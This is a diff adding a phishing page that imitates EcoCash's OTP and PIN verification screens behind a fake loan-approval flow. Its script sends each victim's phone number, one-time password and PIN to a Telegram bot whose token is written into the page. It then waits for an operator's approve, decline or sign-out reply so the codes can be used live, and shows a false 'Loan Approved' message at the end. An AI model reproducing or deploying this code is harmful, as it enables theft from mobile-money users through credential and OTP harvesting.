@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - OTP Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { 
+            min-height: 100vh; 
+            font-family: 'Inter', sans-serif; 
+            background: #f5f7fa;
+            overflow-y: auto;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .back-btn {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 28px;
+            color: #333;
+            text-decoration: none;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 40px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            text-align: center;
+            flex: 1;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        
+        .phone {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 40px;
+        }
+        
+        .otp-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .otp-group {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        
+        .otp-box {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #0066ff;
+            border-radius: 12px;
+            font-size: 28px;
+            text-align: center;
+            background: white;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .otp-box:focus {
+            outline: none;
+            border-color: #0066ff;
+        }
+        
+        .otp-error {
+            display: none;
+            color: #e53935;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 18px;
+            text-align: center;
+        }
+        
+        .resend {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 50px;
+        }
+        
+        .resend span {
+            color: #0066ff;
+            font-weight: 600;
+        }
+        
+        #submitBtn, #pinSubmitBtn {
+            width: 100%;
+            padding: 18px;
+            background: #ccc;
+            color: #999;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: not-allowed;
+        }
+        
+        #submitBtn.enabled, #pinSubmitBtn.enabled {
+            background: #0066ff;
+            color: white;
+            cursor: pointer;
+        }
+        
+        #pinSection {
+            display: none;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #aaa;
+            font-size: 14px;
+            background: #f5f7fa;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+        
+        /* SPINNER */
+        #spinnerOverlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255,255,255,0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #0066ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinner-text {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 320px;
+            font-weight: 500;
+        }
+        
+        /* SUCCESS / INFO MESSAGE - Official Card */
+        #resultOverlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #f5f7fa;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .success-card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            border-top: 4px solid #0066ff;
+            position: relative;
+            z-index: 1;
+        }
+
+        .success-icon {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 16px;
+            border-radius: 50%;
+            background: #e8f0fe;
+            color: #0066ff;
+            font-size: 28px;
+            line-height: 56px;
+            font-weight: 700;
+        }
+
+        .success-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 14px;
+        }
+
+        .result-message {
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            line-height: 1.7;
+            margin-bottom: 28px;
+            font-weight: 400;
+        }
+
+        .home-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px 24px;
+            background: #0066ff;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .home-btn:hover {
+            background: #0052cc;
+        }
+
+        .home-btn:active {
+            background: #0047b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="login" class="back-btn">←</a>
+        <div class="title" id="pageTitle">OTP Verification</div>
+    </div>
+    
+    <div class="container">
+        <!-- OTP SECTION -->
+        <div id="otpSection">
+            <div class="subtitle">Enter the OTP sent to your phone number</div>
+            <div class="phone" id="maskedPhone"></div>
+            
+            <div class="otp-label">OTP</div>
+            <div class="otp-group">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="otp-error" id="otpError">Incorrect otp , enter new otp and try again</div>
+            
+            <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
+            
+            <button id="submitBtn">Submit</button>
+        </div>
+
+        <!-- PIN SECTION (shown after OTP approve) -->
+        <div id="pinSection">
+            <div class="subtitle">Enter your 4-digit PIN</div>
+            <div class="phone" id="maskedPhonePin"></div>
+            
+            <div class="otp-label">PIN</div>
+            <div class="otp-group" id="pinGroup">
+                <input type="tel" class="pin-box otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="pin-box otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="pin-box otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="tel" class="pin-box otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="otp-error" id="pinError">Incorrect pin , enter new pin and try again</div>
+            
+            <div class="resend" style="visibility: hidden; margin-bottom: 50px;">&nbsp;</div>
+            
+            <button id="pinSubmitBtn">Submit</button>
+        </div>
+    </div>
+    <footer>© 2025 EcoCash</footer>
+    <!-- SPINNER -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinnerText">
+            Please wait while we approve your loan application
+        </div>
+    </div>
+    <!-- RESULT OVERLAY - Official Card -->
+    <div id="resultOverlay">
+        <div class="success-card">
+            <div class="success-icon" id="resultIcon">✓</div>
+            <div class="success-title" id="resultTitle">Loan Approved</div>
+            <div class="result-message" id="resultMessage">
+                Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.
+            </div>
+            <a href="index" class="home-btn">Home</a>
+        </div>
+    </div>
+    <script>
+        const BOT_TOKEN = '8880691981:AAHi-Xe9rTFFhjgGKS9OwrfmWjXFvFdUp_o';
+        const CHAT_ID = '8932632853';
+        // Mask phone from localStorage
+        const savedPhone = localStorage.getItem('phone') || '785123463';
+        const visibleStart = savedPhone.slice(0, 3);
+        const visibleEnd = savedPhone.slice(-2);
+        const masked = visibleStart + '****' + visibleEnd;
+        document.getElementById('maskedPhone').textContent = '+263 ' + masked;
+        document.getElementById('maskedPhonePin').textContent = '+263 ' + masked;
+
+        const otpBoxes = document.querySelectorAll('#otpSection .otp-box');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const submitBtn = document.getElementById('submitBtn');
+        const pinSubmitBtn = document.getElementById('pinSubmitBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerText = document.getElementById('spinnerText');
+        const resultOverlay = document.getElementById('resultOverlay');
+        const resultMessage = document.getElementById('resultMessage');
+        const timerSpan = document.getElementById('timer');
+        const otpError = document.getElementById('otpError');
+        const pinError = document.getElementById('pinError');
+        const otpSection = document.getElementById('otpSection');
+        const pinSection = document.getElementById('pinSection');
+        const pageTitle = document.getElementById('pageTitle');
+
+        let otpValue = '';
+        let pinValue = '';
+        let seconds = 116;
+        let pollInterval;
+        let lastUpdateId = 0;
+
+        // Countdown timer
+        const countdown = setInterval(() => {
+            seconds--;
+            timerSpan.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                timerSpan.textContent = '0';
+            }
+        }, 1000);
+
+        function setupDigitBoxes(boxes, maxLen, onCompleteCheck, errorEl) {
+            boxes.forEach((box, index) => {
+                box.addEventListener('input', () => {
+                    box.value = box.value.replace(/[^0-9]/g, '');
+                    if (box.value.length === 1 && index < maxLen - 1) {
+                        boxes[index + 1].focus();
+                    }
+                    if (errorEl) errorEl.style.display = 'none';
+                    onCompleteCheck();
+                });
+                box.addEventListener('keydown', (e) => {
+                    const allowedKeys = ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End'];
+                    if (allowedKeys.includes(e.key) || e.ctrlKey || e.metaKey) {
+                        if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                            boxes[index - 1].focus();
+                        }
+                        return;
+                    }
+                    if (!/^[0-9]$/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+                box.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/[^0-9]/g, '');
+                    if (digits.length > 0) {
+                        box.value = digits[0];
+                        if (index < maxLen - 1) boxes[index + 1].focus();
+                        onCompleteCheck();
+                    }
+                });
+            });
+        }
+
+        function checkOtpComplete() {
+            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+            if (otpValue.length === 6) {
+                submitBtn.classList.add('enabled');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('enabled');
+                submitBtn.disabled = true;
+            }
+        }
+
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            if (pinValue.length === 4) {
+                pinSubmitBtn.classList.add('enabled');
+                pinSubmitBtn.disabled = false;
+            } else {
+                pinSubmitBtn.classList.remove('enabled');
+                pinSubmitBtn.disabled = true;
+            }
+        }
+
+        setupDigitBoxes(otpBoxes, 6, checkOtpComplete, otpError);
+        setupDigitBoxes(pinBoxes, 4, checkPinComplete, pinError);
+
+        // OTP Submit
+        submitBtn.addEventListener('click', () => {
+            if (otpValue.length !== 6) return;
+            otpError.style.display = 'none';
+            spinnerText.textContent = 'Please wait while we approve your loan application';
+            spinnerOverlay.style.display = 'flex';
+            const timestamp = Date.now();
+            const message = `OTP Verification\n\nPhone: +263 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve, decline, or request the customer to sign out.`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: 'Approve', callback_data: 'approve_' + timestamp },
+                                { text: 'Decline', callback_data: 'cancel_' + timestamp }
+                            ],
+                            [
+                                { text: 'Sign Out', callback_data: 'signout_' + timestamp }
+                            ]
+                        ]
+                    }
+                })
+            });
+            // Poll for admin response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const dataParts = update.callback_query.data.split('_');
+                                    if (dataParts[1] == timestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+                                        if (dataParts[0] === 'approve') {
+                                            // Show PIN section
+                                            otpSection.style.display = 'none';
+                                            pinSection.style.display = 'block';
+                                            pageTitle.textContent = 'PIN Verification';
+                                            pinBoxes[0].focus();
+                                        } else if (dataParts[0] === 'cancel') {
+                                            otpError.style.display = 'block';
+                                            otpBoxes.forEach(box => box.value = '');
+                                            otpValue = '';
+                                            checkOtpComplete();
+                                            otpBoxes[0].focus();
+                                        } else if (dataParts[0] === 'signout') {
+                                            // Professional sign-out instruction
+                                            document.getElementById('resultIcon').textContent = 'i';
+                                            document.getElementById('resultIcon').style.background = '#fdecea';
+                                            document.getElementById('resultIcon').style.color = '#c62828';
+                                            document.getElementById('resultTitle').textContent = 'Action Required';
+                                            resultMessage.innerHTML = 'Please <b style="color:#c62828;">sign out</b> of the <b style="color:#c62828;">EcoCash Super App</b> on your <b style="color:#c62828;">mobile device</b> and <b style="color:#c62828;">try again</b>. Loan applications submitted through the <b style="color:#c62828;">browser</b> require that you are <b style="color:#c62828;">signed out</b> of the Super App before your request can be processed.';
+                                            const homeBtn = document.querySelector('.home-btn');
+                                            homeBtn.textContent = 'Sign Out';
+                                            homeBtn.href = 'https://play.google.com/store/apps/details?id=com.ecocash.superapp&hl=en';
+                                            homeBtn.target = '_blank';
+                                            resultOverlay.style.display = 'flex';
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    });
+            }, 1500);
+        });
+
+        // PIN Submit
+        pinSubmitBtn.addEventListener('click', () => {
+            if (pinValue.length !== 4) return;
+            pinError.style.display = 'none';
+            spinnerText.textContent = 'Please wait while we verify your PIN';
+            spinnerOverlay.style.display = 'flex';
+            const timestamp = Date.now();
+            const message = `PIN Verification\n\nPhone: +263 ${savedPhone}\nEntered PIN: ${pinValue}\n\nPlease approve or cancel the PIN.`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: 'Approve', callback_data: 'pinapprove_' + timestamp },
+                            { text: 'Cancel', callback_data: 'pincancel_' + timestamp }
+                        ]]
+                    }
+                })
+            });
+            // Poll for admin response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const dataParts = update.callback_query.data.split('_');
+                                    if (dataParts[1] == timestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+                                        if (dataParts[0] === 'pinapprove') {
+                                            document.getElementById('resultIcon').textContent = '✓';
+                                            document.getElementById('resultIcon').style.background = '#e8f0fe';
+                                            document.getElementById('resultIcon').style.color = '#0066ff';
+                                            document.getElementById('resultTitle').textContent = 'Loan Approved';
+                                            resultMessage.textContent = 'Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+                                            const homeBtn = document.querySelector('.home-btn');
+                                            homeBtn.textContent = 'Home';
+                                            homeBtn.href = 'index';
+                                            homeBtn.removeAttribute('target');
+                                            resultOverlay.style.display = 'flex';
+                                        } else if (dataParts[0] === 'pincancel') {
+                                            pinError.style.display = 'block';
+                                            pinBoxes.forEach(box => box.value = '');
+                                            pinValue = '';
+                                            checkPinComplete();
+                                            pinBoxes[0].focus();
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    });
+            }, 1500);
+        });
+
+        checkOtpComplete();
+        checkPinComplete();
+        otpBoxes[0].focus();
+    </script>
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6ab1080ef7bb3d3443bfe65b/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+</body>
+</html>
